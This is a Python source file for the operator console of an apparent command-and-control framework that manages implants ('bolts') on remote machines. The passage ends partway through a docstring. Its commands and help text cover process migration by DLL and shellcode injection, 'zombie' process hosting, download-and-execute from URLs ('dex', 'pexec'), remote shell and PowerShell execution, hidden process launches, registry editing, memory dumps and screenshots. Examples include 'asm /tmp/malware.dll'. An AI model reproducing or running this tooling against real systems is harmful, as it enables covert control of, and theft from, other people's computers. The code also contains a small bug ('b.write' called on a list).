#!/usr/bin/python3

from cmd import Cmd
from os import getcwd
from json import dumps
from shlex import split
from string import whitespace
from datetime import datetime
from traceback import format_exc
from include.config import Config
from re import compile, Pattern, I
from argparse import ArgumentParser
from importlib import import_module
from include.errors import find_error
from sys import stdin, stdout, stderr
from base64 import b64decode, b64encode
from include.cirrus import Filter, split_dll
from os.path import isfile, expanduser, expandvars, join
from include.util import nes, ip_str, perm_str, size_str, time_str
from readline import (
    get_begidx,
    get_endidx,
    get_completer,
    set_completer,
    parse_and_bind,
    get_line_buffer,
    read_history_file,
    write_history_file,
    set_history_length,
)


_EMPTY = list()
_BOOLEANS = ["1", "t", "y", "true", "yes", "on"]

MENUS = [
    ["_MenuMain", None],
    ["_MenuBolts", None],
    ["_MenuBolt", None],
    None,
    ["_MenuProfiles", None],
    ["_MenuProfile", None],
    ["_MenuListeners", None],
    ["_MenuListener", None],
]
MENU_MAIN = 0
MENU_BOLTS = 1
MENU_BOLT = 2
MENU_BOLT_ALL = 3
MENU_PROFILES = 4
MENU_PROFILE = 5
MENU_LISTENERS = 6
MENU_LISTENER = 7
MENU_JOBS = 8
MENU_JOB = 9

HELP_TEXT = [
    "Main Menu",
    "Bolts",
    None,
    None,
    "Profiles",
    "Profile",
    "Listeners",
    "Listener",
]

HISTORY_FILE = "~/.cache/doppler-cli.hist"

# TODO(dij):
#           Profile: Implement new
#           Profile: Implement edit
#           Listeners: Get Bolts connected to Listener. (bolts|bolt)
#           Bolt-All: implement


def _ex(v):
    return isinstance(v, Pattern) or (isinstance(v, str) and len(v) > 0)


def _do_ask(m):
    try:
        v = input(f"[?] {m}? [Y/n] ")
        if not nes(v) or v.lower() != "y":
            return False
        return True
    except (EOFError, KeyboardInterrupt):
        pass
    return False


def __parsers():
    p = [None] * 9
    p[0] = ArgumentParser("migrate", add_help=False)
    p[0].error = __parser_nop
    p[0].add_argument("-a", "--args", type=str, dest="args", required=False)
    p[0].add_argument("-t", "--target", type=str, dest="target", required=False)
    p[0].add_argument("-m", "--method", type=str, dest="method", required=False)
    p[0].add_argument("-R", "--no-reflect", dest="reflect", action="store_false")
    p[0].add_argument("-p", "--profile", type=str, dest="profile", required=False)
    p[0].add_argument(nargs=1, type=str, dest="pipe")
    p[0].add_argument(nargs=1, type=str, dest="file")
    p[1] = ArgumentParser("spawn", add_help=False)
    p[1].error = __parser_nop
    p[1].add_argument("-a", "--args", type=str, dest="args", required=False)
    p[1].add_argument("-t", "--target", type=str, dest="target", required=False)
    p[1].add_argument("-m", "--method", type=str, dest="method", required=False)
    p[1].add_argument("-R", "--no-reflect", dest="reflect", action="store_false")
    p[1].add_argument("-p", "--profile", type=str, dest="profile", required=False)
    p[1].add_argument(nargs=1, type=str, dest="pipe")
    p[1].add_argument(nargs=1, type=str, dest="file")
    p[2] = ArgumentParser("regedit", add_help=False)
    p[2].error = __parser_nop
    p[2].add_argument("-f", "--force", dest="force", action="store_true")
    p[2].add_argument(nargs=1, type=str, dest="action")
    p[2].add_argument(nargs=1, type=str, dest="key")
    p[2].add_argument(nargs=1, type=str, dest="value")
    p[2].add_argument(nargs=1, type=str, dest="exp")
    p[2].add_argument(nargs=1, type=str, dest="data")
    p[3] = ArgumentParser("dll", add_help=False)
    p[3].error = __parser_nop
    p[3].add_argument("-d", "--detach", dest="detach", action="store_true")
    p[3].add_argument("-r", "--reflect", dest="reflect", action="store_true")
    p[3].add_argument(nargs=1, type=str, dest="dll")
    p[4] = ArgumentParser("proxy", add_help=False)
    p[4].error = __parser_nop
    p[4].add_argument("-r", "--remove", dest="remove", action="store_true")
    p[4].add_argument("-p", "--profile", type=str, dest="profile", required=False)
    p[4].add_argument(nargs=1, type=str, dest="name")
    p[4].add_argument(nargs=1, type=str, dest="bind")
    p[5] = ArgumentParser("rm", add_help=False)
    p[5].error = __parser_nop
    p[5].add_argument("-f", "--force", dest="force", action="store_true")
    p[5].add_argument(nargs=1, type=str, dest="path")
    p[6] = ArgumentParser("dex", add_help=False)
    p[6].error = __parser_nop
    p[6].add_argument("-d", "--detach", dest="detach", action="store_true")
    p[6].add_argument(nargs=1, type=str, dest="url")
    p[7] = ArgumentParser("zombie", add_help=False)
    p[7].error = __parser_nop
    p[7].add_argument("-d", "--detach", dest="detach", action="store_true")
    p[7].add_argument(nargs=1, type=str, dest="file")
    p[7].add_argument(nargs=1, type=str, dest="args")
    p[8] = ArgumentParser("asm", add_help=False)
    p[8].error = __parser_nop
    p[8].add_argument("-d", "--detach", dest="detach", action="store_true")
    p[8].add_argument(nargs=1, type=str, dest="file")
    return p


def _strip_rn(v):
    if not nes(v):
        return v
    if v[-1] == "\n":
        return v[:-1]
    return v


def _grab_first(v):
    if not isinstance(v, list):
        return None
    if len(v) > 0:
        return v[0]
    return None


def _split_list(v):
    if not nes(v):
        return None
    e = split(v)
    if not isinstance(e, list) or len(e) == 0:
        del e
        return None
    if len(e) == 1 and "," not in e[0]:
        del e
        return [v]
    r = list()
    for s in e:
        if "," not in s:
            r.append(s.strip())
            continue
        for n in s.split(","):
            r.append(n.strip())
    del e
    return r


def __parser_nop(_):
    pass


def _is_match(m, v):
    if not nes(v):
        return False
    if isinstance(m, Pattern):
        return m.match(v) is not None
    if nes(m) and m in v.lower():
        return True
    return False


def _is_bool_true(v):
    if not nes(v):
        return False
    return v.strip().lower() in _BOOLEANS


def _quick_filter(v):
    f = Filter()
    try:
        f.pid = int(v)
        return f
    except ValueError:
        pass
    f.include = _split_list(v)
    return f


def _print_listener_info(v):
    c = Config(b64decode(v["profile"], validate=True))
    print(
        f'Listener: {v["listener"]["name"]}\n{"="*30}\nProfile : {v["profile_name"]} ({c})'
    )
    print(dumps(c.json(), sort_keys=False, indent=4))
    del c
    print(f'Address : {v["listener"]["address"]}')
    if "type" in v["listener"]:
        print(f'Type    : {v["listener"]["type"]}')
    print(f'Bolts   : {v["listener"]["count"]}')


def _complete_with_all(e, n):
    if len(n) == 0 or n in "all":
        return e + ["all"]
    return e


def _menu(v, menu, inv=False):
    if not nes(v):
        return menu
    if inv:
        s = v.strip().upper()
    else:
        s = v.strip().lower()
    if len(s) == 0:
        return menu
    r = list()
    for e in menu:
        if e.startswith(s):
            r.append(e)
        if inv and e.startswith(s.lower()):
            r.append(e)
    return r


def _get_callable(type, show, r):
    if not nes(r.method):
        if r.file is None or len(r.file) == 0 or not nes(r.file[0]):
            return "", None
        if r.file[0].lower() == "self":
            return "", None
        if r.file[0].lower().startswith("http") and "://" in r.file[0]:
            return "pexec", r.file[0]
        return "exec", {"cmd": r.file[0], "show": show}
    m = r.method.lower()
    if m == "self":
        return "", None
    if r.file is None or len(r.file) == 0 or not nes(r.file[0]):
        print(f"[!] {type}: missing file!")
        return None, None
    if m == "url":
        return "pexec", r.file[0]
    if (m == "zombie") and (r.args is None or len(r.args) == 0 or not nes(r.args[0])):
        print(f"[!] {type}: missing fake arguments for zombie process!")
        return None, None
    v = r.file[0]
    if m == "exec" or m == "exe":
        return "exec", {"cmd": v, "show": show}
    if m == "dll":
        p = {"show": show, "reflect": r.reflect}
        split_dll(p, v)
        del v
        return "dll", p
    if m == "asm" or m == "zombie":
        p = {"show": show}
        with open(expanduser(expandvars(v)), "rb") as f:
            p["data"] = b64encode(f.read()).decode("UTF-8")
        if m == "zombie":
            p["fake"] = r.args
        del v
        return m, p
    del v
    print(f"[!] {type}: invalid/unguessable method!")
    return None, None


def print_job_result(id, job, res, arg, out):
    print(f"[+] {id}: Job {job} ", end="")
    if nes(arg):
        print(f'"{arg}" ', end="")
    if not isinstance(res, dict):
        return print("done.")
    if "error" in res:
        v = res["error"]
        try:
            m = find_error(int(v, 16))
            if m is not None:
                return print(f"error: {m}")
            del m
        except ValueError:
            pass
        return print(f"error: {v}")
    type = res["type"]
    if type == "pwd":
        return print(
            f'returned: {b64decode(res["data"],validate=True).decode("UTF-8")}'
        )
    if type == "list":
        if "entries" not in res or len(res["entries"]) == 0:
            return print("returned: 0 entries")
        print(f'returned: {len(res["entries"])} entries')
        t = datetime.now()
        for i in res["entries"]:
            v = datetime.fromisoformat(i["modtime"]).replace(tzinfo=None)
            y = None
            if v.year < t.year:
                y = v.strftime("%Y")
            else:
                y = v.strftime("%H:%M")
            print(
                f'{perm_str(i["mode"])} {size_str(i["size"]):>8} '
                f'{v.strftime("%b"):>3} {v.strftime("%-m"):>2} {y:>5} {i["name"]}'
            )
            del y
            del v
        del t
        return
    if type == "spawn":
        return print(f'spawned PID: {res.get("pid", 0)}.')
    if type == "mounts":
        if "entries" not in res or len(res["entries"]) == 0:
            return print("returned: 0 entries")
        print(f'returned: {len(res["entries"])} entries.')
        for i in res["entries"]:
            print(i)
        return
    if type == "upload":
        return print(
            f'wrote {size_str(res.get("size", 0))} to '
            f'{b64decode(res["data"],validate=True).decode("UTF-8", errors="replace")}'
        )
    if type == "execute":
        return print(
            f'returned.\n[+] PID: {res.get("pid", "n/a")}, Exit Result: {res.get("exit", 0)}\n'
            f'{_strip_rn(b64decode(res["data"], validate=True).decode("UTF-8",errors="replace"))}'
        )
    if type == "registry":
        if "status" in res:
            if not res["status"]:
                return print("set/update failed!")
            return print("done.")
        if "entries" not in res:
            return print("done.")
        print(
            f'returned {len(res["entries"])} entries.\n{"Name":32}{"Type":16}Value\n{"="*85}'
        )
        for v in res["entries"]:
            if "name" not in v:
                continue
            print(f'{v["name"]:32}{v["type"]:16}', end="")
            d = v["value"]
            if len(d) > 64:
                d = d[:64] + "..."
            print(d.replace("\n", "\\n"))
        return
    if type == "download":
        print(f'read {size_str(res.get("size", 0))} from "{res.get("path")}"')
        if res.get("dir", False):
            return print(
                f'[!] Path {res.get("path")} is a directory, not downloaded!\n'
            )
        if not nes(out):
            return print(
                _strip_rn(
                    b64decode(res["data"], validate=True).decode(
                        "UTF-8", errors="replace"
                    )
                )
            )
        p = expanduser(expandvars(out))
        with open(p, "wb") as f:
            f.write(b64decode(res["data"], validate=True))
            f.flush()
        print(f'[+] Saved to "{p}".')
        del p
        return
    if type == "check_dll":
        return print(f'tained: {res.get("tainted", False)}')
    if type == "processes":
        if "entries" not in res or len(res["entries"]) == 0:
            return print(" returned: 0 entries")
        print(
            f' returned: {len(res["entries"])} entries.\n{"Name":32}{" PID":>10}{" PPID":>10}\n{"="*52}'
        )
        for i in res["entries"]:
            print(f'{i["name"]:32}{i["pid"]:10}{i["ppid"]:10}')
        return
    if type == "system_io":
        if "status" in res:
            if not res["status"]:
                return print("io operation failed!")
            return print("done.")
        return print(f'{size_str(res.get("size", 0))} at {res["path"]}')
    if type == "dump" or type == "shot":
        if nes(out):
            p = expanduser(expandvars(out))
        else:
            p = f'{id}-{job}-{datetime.now().strftime("%m%d%y-%H%M")}'
            if type == "dump":
                p = p + ".dmp"
            else:
                p = p + ".png"
            p = join(getcwd(), p)
        with open(p, "wb") as f:
            f.write(b64decode(res["data"], validate=True))
            f.flush()
        print(f'saved to "{p}".')
        del p
        return
    if type == "assembly" or type == "dll":
        return print(
            f' returned.\n[+] PID: {res.get("pid", "n/a")}, Handle: {res.get("handle", 0):X} '
            f'Exit Result: {res.get("exit", 0)}'
        )
    if type == "migrate" or type == "rename":
        return print("done.")
    if type == "reload_dll" or type == "rev2self" or type == "profile":
        return print("done.")
    if type == "refresh" or type == "cd" or type == "time" or type == "elevate":
        return print("done.")
    return print(f'returned an unknown type: "{type}"!')


_PARSERS = __parsers()


class Exp(object):
    def __init__(self, host, ip, os, user, elevated):
        self.elevated = elevated
        self.ip = Exp._compile(ip)
        self.os = Exp._compile(os)
        self.user = Exp._compile(user)
        self.host = Exp._compile(host)

    @staticmethod
    def parse(v):
        if not nes(v):
            return None
        s = split(v)
        if len(s) == 0:
            return None
        h = None
        i = None
        o = None
        u = None
        a = None
        for e in s:
            if ":" in e:
                n = e.find(":")
                if n < 1:
                    raise ValueError(f'invalid expression value "{e}"')
                x = e[:n].lower()
                if len(x) < 1:
                    raise ValueError(f'invalid expression value "{e}"')
                if x[0] == "u":
                    if not nes(u):
                        u = e[n + 1 :]
                        continue
                    raise ValueError('"user" expression value specified multiple times')
                if x[0] == "i":
                    if not nes(i):
                        i = e[n + 1 :]
                        continue
                    raise ValueError('"ip" expression value specified multiple times')
                if x[0] == "o":
                    if not nes(o):
                        o = e[n + 1 :]
                        continue
                    raise ValueError('"os" expression value specified multiple times')
                if x[0] == "e" or x[0] == "a":
                    if a is None:
                        a = _is_bool_true(e[n + 1 :])
                        continue
                    raise ValueError(
                        '"admin" or "elevated" expression value specified multiple times'
                    )
                if x[0] == "h":
                    if not nes(h):
                        h = e[n + 1 :]
                        continue
                    raise ValueError('"host" expression value specified multiple times')
                raise ValueError(f'invalid expression value "{e}"')
            else:
                if not nes(h):
                    h = e
                    continue
                raise ValueError('"host" expression value specified multiple times')
        del s
        e = Exp(h, i, o, u, a)
        del h
        del i
        del o
        del u
        del a
        return e

    @staticmethod
    def _compile(v):
        if not nes(v):
            return None
        if v[0] == "^":
            try:
                return compile(v[1:], I)
            except Exception:
                pass
        return v

    def __str__(self):
        b = list()
        if self.elevated is not None:
            b.append(f"admin:{self.elevated}")
        if self.ip is not None:
            b.append(f"ip:{self.ip}")
        if self.os is not None:
            b.append(f"os:{self.os}")
        if self.user is not None:
            b.append(f"user:{self.user}")
        if self.host is not None:
            b.write(f"host:{self.host}")
        if len(b) == 0:
            return ""
        return ",".join(b)

    def matches(self, v):
        if (
            self.ip is None
            and self.os is None
            and self.user is None
            and self.host is None
            and self.elevated is None
        ):
            return v
        if not isinstance(v, list) or len(v) == 0:
            return v
        n = list()
        for i in v:
            if "device" not in i:
                continue
            if isinstance(self.elevated, bool):
                if self.elevated and i["device"]["elevated"]:
                    n.append(i)
                elif not self.elevated and not i["device"]["elevated"]:
                    n.append(i)
                continue
            if _ex(self.ip) and _is_match(self.ip, ip_str(i)):
                n.append(i)
                continue
            if _ex(self.os) and _is_match(self.os, i["device"]["os"]):
                n.append(i)
                continue
            if _ex(self.user) and _is_match(self.user, i["device"]["user"]):
                n.append(i)
                continue
            if _ex(self.host) and _is_match(self.host, i["device"]["hostname"]):
                n.append(i)
                continue
        return n


class _Cache(object):
    def __init__(self, cirrus):
        self._jobs = None
        self._bolts = None
        self.cirrus = cirrus
        self._profiles = None
        self._listeners = None

    def jobs(self, n):
        return list()

    def bolts(self, n):
        if self._bolts is None:
            self._bolts = [i["id"].upper() for i in self.cirrus.sessions()]
        if len(self._bolts) > 0:
            if nes(n):
                n = n.upper()
            r = list()
            for e in self._bolts:
                if not nes(n) or e.startswith(n):
                    r.append(e)
            return r
        return self._bolts

    def profiles(self, n):
        if self._profiles is None:
            self._profiles = [i.lower() for i in self.cirrus.profiles().keys()]
        if len(self._profiles) > 0:
            if nes(n):
                n = n.lower()
            r = list()
            for e in self._profiles:
                if not nes(n) or e.startswith(n):
                    r.append(e)
            return r
        return self._profiles

    def listeners(self, n):
        if self._listeners is None:
            self._listeners = [i.lower() for i in self.cirrus.listeners().keys()]
        if len(self._listeners) > 0:
            if nes(n):
                n = n.lower()
            r = list()
            for e in self._listeners:
                if not nes(n) or e.startswith(n):
                    r.append(e)
            return r
        return self._listeners


class _MenuMain(object):
    _MENU = [
        "bolt",
        "bolts",
        "exit",
        "help",
        "job",
        "jobs",
        "listener",
        "listeners",
        "profile",
        "profiles",
    ]

    def __init__(self, shell):
        self.shell = shell

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_bolt(self, id):
        if len(id) == 0:
            return print("bolt <id|all>")
        if id == "all":
            return self.shell.set_menu(MENU_BOLT_ALL)
        try:
            self.shell.cirrus.session(id)
        except ValueError:
            return print(f'[!] Bolt "{id}" does not exist!')
        self.shell.set_menu(MENU_BOLT, id.upper())

    def do_profile(self, n):
        if len(n) == 0:
            return print("profile <name>")
        try:
            self.shell.cirrus.profile(n)
        except ValueError:
            return print(f'[!] Profile "{n}" does not exist!')
        self.shell.set_menu(MENU_PROFILE, n.lower())

    def do_profiles(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_listener(self, n):
        if len(n) == 0:
            return print("listener <name>")
        try:
            self.shell.cirrus.listener(n)
        except ValueError:
            return print(f'[!] Listener "{n}" does not exist!')
        self.shell.set_menu(MENU_LISTENER, n.lower())

    def do_listeners(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def prompt(self, args=None):
        return " > "

    def complete_job(self, n, *_):
        return self.shell.cache.jobs(n)

    def complete_bolt(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def completenames(self, n, *_):
        return _menu(n, _MenuMain._MENU)

    def complete_profile(self, n, *_):
        return self.shell.cache.profiles(n)

    def complete_listener(self, n, *_):
        return self.shell.cache.listeners(n)


class _MenuBolt(object):
    _MENU = [
        "asm",
        "back",
        "cat",
        "cd",
        "chan",
        "check_dll",
        "cp",
        "dex",
        "dll",
        "download",
        "elevate",
        "exit",
        "help",
        "hup",
        "info",
        "jitter",
        "job",
        "jobs",
        "kill",
        "last",
        "ls",
        "main",
        "migrate",
        "mounts",
        "mv",
        "parent",
        "parent_clear",
        "parent_desktop",
        "parent_elevated",
        "parent_exclude",
        "parent_fallback",
        "parent_include",
        "parent_name",
        "parent_pid",
        "procdump",
        "procname",
        "profile",
        "proxy",
        "ps",
        "pwsh",
        "pull",
        "pwd",
        "refresh",
        "regedit",
        "reload_dll",
        "rev2self",
        "rm",
        "run",
        "screenshot",
        "set_hide",
        "shell",
        "sleep",
        "spawn",
        "touch",
        "upload",
        "write",
        "zombie",
    ]
    _MENU_REGEDIT = [
        "get",
        "set",
        "edit",
        "update",
        "delete",
        "del",
        "rm",
        "rem",
        "remove",
        "ls",
        "dir",
    ]

    def do_migrate(self, *a):
        """
        migrate [-m method] [-t process_name|pid] [-p profile] [-a args] [-R] <pipe> [file]

        Migrate control to another process using a type of method. The method can
        be specified by the "-m" argument. The "pipe" argument is required and
        specifies what pipe name to use to connect to the new instance. The pipe
        value is most likely compiled into the client.

        By default, the current profile will be used, but can be changed by
        specifying the name with the "-p" argument.

        The following methods are valid:
        dll:
        |  Use the "file" specified as a DLL migration method. This method requires
        |  a target to be specified as the host for the DLL. By default, if the
        |  "-R" or "--no-reflect" arguments are NOT supplied, this will convert
        |  the DLL to assembly before sending it to the client. Otherwise the
        |  DLL file will be written to disk before loading.
        |  If a path is specified or a remote path is used instead, the "-R" and
        |  "--no-reflect" arguments are ignored.
        asm:
        |  Use the "file" specified as assembly migrate code. This method requires
        |  a target to be specified as the host for the shellcode. If the "file"
        |  path is a DLL, this will convert the DLL to assembly before sending it
        |  to the client.
        exec|exe:
        |  Execute a command as the migrate method. This is the default option
        |  if a method is not specified. If the special value "self" is used, this
        |  will use the current client binary path to execute instead.
        pexec|url:
        |  Download a payload and execute it as a migrate method. This works
        |  similar to the "dex" command and follows the same content rules.
        |  This method will be automatically selected if a URL is detected and
        |  no method is specified. To force the usage of this method, use "pexec"
        |  or "url" as the "-m" argument value.
        |  If a target is specified and the downloaded type requires a target, it
        |  will be used, otherwise a random process will be chosen.
        |  If the download type is a command type the parent can be controlled by
        |  the parent filter, which can be updated with the filter commands. By
        |  default the parent will be the current client process if not set.
        zombie:
        |  Use the "file" specified as assembly migrate code in a zombified process.
        |  This method requires a command to be used as the host, supplied using the
        |  "-a" argument. The running binary must exist but the arguments may be
        |  random/invalid. If the "file"path is a DLL, this will convert the DLL
        |  to assembly before sending it to the client.
        |  The parent of the zombie process can be controlled by the parent filter,
        |  which can be updated with the filter commands. By default the parent
        |  will be the current client process if not set.

        The arguments for this command are similar to the "spawn" command.

        Examples:
            migrate pipe-me self
            migrate -m exec pipe-me
            migrate -p my_profile -m dll pipe-me ~/implant.dll
            migrate pipe-me http://path.to.shell.code
            migrate -m url pipe-me path.to.shell.code
            migrate -p my_profile -m asm ~/bolt.bin
            migrate -m zombie -a notepad.exe ~/implant.dll
        """
        if len(a) < 1:
            return print(
                "migrate [-t process_name|pid] [-m method] [-p profile] [-a args] [-r reflect] <pipe> [file]"
            )
        r = _PARSERS[0].parse_args(a)
        if r.pipe is None or len(r.pipe) == 0 or not nes(r.pipe[0]):
            return print("[!] migrate: invalid/missing pipe name")
        f = self.filter
        if nes(r.target):
            f = _quick_filter(r.target)
        try:
            m, c = _get_callable("migrate", self.show, r)
        except (ValueError, OSError) as err:
            return print(f"[!] {err}!")
        if m is None and c is None:
            return
        self._exec(
            self.shell.cirrus.task_migrate,
            name=r.pipe[0],
            method=m,
            profile=r.profile,
            exec=c,
            filter=f,
        )
        del f
        del m
        del c
        del r

    def jobs(self, _):
        """
        jobs

        Display Jobs in progress or cached completed Jobs.
        """
        self.shell.cirrus.show_jobs(self.id, all=False)

    def job(self, id):
        """
        job <job_id>

        Retrieve the results of a completed Job.

        Examples:
            job 1337
        """
        if len(id) == 0:
            return print("job <job_id>")
        try:
            self.shell.cirrus.job_result(self.id, int(id), False)
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_spawn(self, *a):
        """
        spawn [-m method] [-t process_name|pid] [-p profile] [-a args] [-R] <pipe> [file]

        Spawn a similar instance of this client using a type of method. The method
        can be specified by the "-m" argument. The "pipe" argument is required and
        specifies what pipe name to use to connect to the new instance. The pipe
        value is most likely compiled into the client.

        By default, the current profile will be used, but can be changed by
        specifying the name with the "-p" argument.

        The following methods are valid:
        dll:
        |  Use the "file" specified as a DLL migration method. This method requires
        |  a target to be specified as the host for the DLL. By default, if the
        |  "-R" or "--no-reflect" arguments are NOT supplied, this will convert
        |  the DLL to assembly before sending it to the client. Otherwise the
        |  DLL file will be written to disk before loading.
        |  If a path is specified or a remote path is used instead, the "-R" and
        |  "--no-reflect" arguments are ignored.
        asm:
        |  Use the "file" specified as assembly migrate code. This method requires
        |  a target to be specified as the host for the shellcode. If the "file"
        |  path is a DLL, this will convert the DLL to assembly before sending it
        |  to the client.
        exec|exe:
        |  Execute a command as the migrate method. This is the default option
        |  if a method is not specified. If the special value "self" is used, this
        |  will use the current client binary path to execute instead.
        pexec|url:
        |  Download a payload and execute it as a migrate method. This works
        |  similar to the "dex" command and follows the same content rules.
        |  This method will be automatically selected if a URL is detected and
        |  no method is specified. To force the usage of this method, use "pexec"
        |  or "url" as the "-m" argument value.
        |  If a target is specified and the downloaded type requires a target, it
        |  will be used, otherwise a random process will be chosen.
        |  If the download type is a command type the parent can be controlled by
        |  the parent filter, which can be updated with the filter commands. By
        |  default the parent will be the current client process if not set.
        zombie:
        |  Use the "file" specified as assembly migrate code in a zombified process.
        |  This method requires a command to be used as the host, supplied using the
        |  "-a" argument. The running binary must exist but the arguments may be
        |  random/invalid. If the "file"path is a DLL, this will convert the DLL
        |  to assembly before sending it to the client.
        |  The parent of the zombie process can be controlled by the parent filter,
        |  which can be updated with the filter commands. By default the parent
        |  will be the current client process if not set.

        The arguments for this command are similar to the "migrate" command.

        Examples:
            spawn pipe-me self
            spawn -m exec pipe-me
            spawn -p my_profile -m dll pipe-me ~/implant.dll
            spawn pipe-me http://path.to.shell.code
            spawn -m url pipe-me path.to.shell.code
            spawn -p my_profile -m asm ~/bolt.bin
            spawn -m zombie -a notepad.exe ~/implant.dll
        """
        if len(a) < 1:
            return print(
                "spawn [-t process_name|pid] [-m method] [-p profile] [-a args] [-r reflect] <pipe> [file]"
            )
        r = _PARSERS[1].parse_args(a)
        if r.pipe is None or len(r.pipe) == 0 or not nes(r.pipe[0]):
            return print("[!] spawn: invalid/missing pipe name")
        f = self.filter
        if nes(r.target):
            f = _quick_filter(r.target)
        try:
            m, c = _get_callable("spawn", self.show, r)
        except (ValueError, OSError) as err:
            return print(f"[!] {err}!")
        if m is None and c is None:
            return
        self._exec(
            self.shell.cirrus.task_spawn,
            name=r.pipe[0],
            method=m,
            profile=r.profile,
            exec=c,
            filter=f,
        )
        del f
        del m
        del c
        del r

    def do_proxy(self, *a):
        _PARSERS[4].parse_args(a)

    def complete_proxy(self, n, c, *_):
        pass

    def __init__(self, shell):
        self.id = None
        self.jobs = None
        self.show = False
        self.shell = shell
        self.filter = None
        self.interrupts = 1

    def do_ls(self, p):
        """
        ls [remote_path]

        Retrieves a list of files in the supplied directory path. If no path is
        given, the client will use the current working directory.

        Environment variables are processed on the client.

        Examples:
            ls
            ls C:/
        """
        if len(p) == 0:
            return self._system("ls")
        if p.startswith("-") and " " in p:
            p = p[p.find(" ") + 1 :]
        self._system(f"ls {p}")

    def do_cd(self, p):
        """
        cd <remote_path>

        Instructs the client to change it's current working directory.

        Environment variables are processed on the client.

        Examples:
            cd C:/
            cd C:/Windows
        """
        if len(p) == 0:
            return print("cd <remote_path>")
        self._system(f"cd {p}")

    def do_ps(self, _):
        """
        ps

        Retrives a list of running processes on the client device.
        """
        self._system("ps")

    def do_rm(self, *a):
        """
        rm [-f|--force] <remote_path>

        Deletes a file at the specified path. The force flag "-f" or "--force"
        may be used to delete recursively or delete non-empty directories.

        Environment variables are processed on the client.

        Examples:
            rm C:/directory
            rm -f C:/my/file/path
        """
        if len(a) == 0:
            return print("rm [-f|--force] <remote_path>")
        r = _PARSERS[5].parse_args(a)
        if r.path is None or len(r.path) == 0 or not nes(r.path[0]):
            return print("rm [-f|--force] <remote_path>")
        self._exec(self.shell.cirrus.task_io_delete, path=r.path[0], force=r.force)
        del r

    def do_hup(self, c):
        """
        hup <command>

        Executes a command on the client but detaches immediately and returns
        without retriving the exit code or stdout/stderr.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The "$" and "." prefixes are allowed for use with this command.

        Examples:
            hup ping 127.0.0.1
            hup echo lol
        """
        if len(c) == 0:
            return print("hup <command>")
        self._exec(
            self.shell.cirrus.task_execute,
            cmd=c,
            show=self.show,
            detach=True,
            filter=self.filter,
        )

    def do_run(self, c):
        """
        run <command>

        Executes a command on the client and will return the PID, exit code and
        any stdout/stderr data once the process completes.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        Examples:
            run ping 127.0.0.1
            run tasklist
        """
        if len(c) == 0:
            return print("run <command>")
        self._exec(
            self.shell.cirrus.task_execute,
            cmd=c,
            show=self.show,
            detach=False,
            filter=self.filter,
        )

    def do_pwd(self, _):
        """
        pwd

        Returns the client's current working directory.
        """
        self._system("pwd")

    def do_cat(self, f):
        """
        cat <remote_path>

        Display the contents of the file at the specified path.

        Environment variables are processed on the client.

        Examples:
            cat C:/file1.txt
            cat C:/Windows/system.ini
        """
        self.do_download(f, None)

    def do_asm(self, *a):
        """
        asm [-d|--detach] <local_file>

        (Windows systems only!)

        Reads the filepath from the local (non-client) filesystem as binary data
        and will run it in memory as assembly.

        If the "-d" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The owning process of this thread can be controlled by the parent filter,
        which can be updated with the filter commands. By default the owner will
        be the current client process if not set.

        If the file is a compiled DLL, this will convert it to shellcode on the
        server side before being sent to the client.

        Examples:
            asm /home/hackerman/gibson.bin
            asm /tmp/malware.dll
        """
        if len(a) == 0:
            return print("asm [-d|--detach] <local_file>")
        r = _PARSERS[8].parse_args(a)
        if r.file is None or len(r.file) == 0 or not nes(r.file[0]):
            return print("asm [-d|--detach] <local_file>")
        self._exec(
            self.shell.cirrus.task_assembly,
            file=r.file[0],
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_dex(self, *a):
        """
        dex [-d|--detach] <url>

        Downloads the file at the supplied URL (as the client) and attempt to
        execute it. The "Content-Type" header determines what action is taken,
        and can take the form of many different types, such as an EXE, PowerShell
        or Assembly for example.

        If the "-d" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        DLL or Binary files make a write to disk.

        The parent of this executable can be controlled by the parent filter,
        which can be updated with the filter commands. By default the parent will
        be the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        Examples:
            dex google.com/robots.txt
        """
        if len(a) == 0:
            return print("dex [-d|--detach] <url>")
        r = _PARSERS[6].parse_args(a)
        if r.url is None or len(r.url) == 0 or not nes(r.url[0]):
            return print("dex [-d|--detach] <url>")
        self._exec(
            self.shell.cirrus.task_pull_exec,
            url=r.url[0],
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_back(self, _):
        """
        back

        Go back to the Bolts menu.
        """
        self.shell.set_menu(MENU_BOLTS)

    def do_exit(self, _):
        """
        back

        Go back to the Bolts menu.
        """
        self.do_back(_)

    def do_help(self, n):
        if len(n) == 0 or n == "help":
            return print("help <command>")
        try:
            d = getattr(self, "do_" + n).__doc__
        except AttributeError:
            return print(f'[!] Help text for: "{n}" not found.')
        for i in d.strip().split("\n"):
            print(i.lstrip(whitespace))
        del d

    def do_info(self, _):
        """
        info

        Display system and client information, such as PID, PPID, user and OS
        version.
        """
        self.shell.cirrus.show_info(self.id)

    def do_pwsh(self, c):
        """
        pwsh <command>

        Executes a command on the client as a PowerShell command will return the
        PID, exit code and any stdout/stderr data once the process completes.

        This handles the location of PowerShell automatically and fails if the
        PowerShell binary cannot be found (both Windows and *nix).

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The dollar sign "$" can be prefixed to a raw command instead to run as
        a PowerShell command instead of using this function.

        Examples:
            pwsh Get-Host
            pwsh Get-WmiObject -Class Win32_BIOS
            $Write-Host "hello"
        """
        if len(c) == 0:
            return print("pwsh <command>")
        self.do_run(f"${c}")

    def do_kill(self, n):
        """
        kill <pid|name>

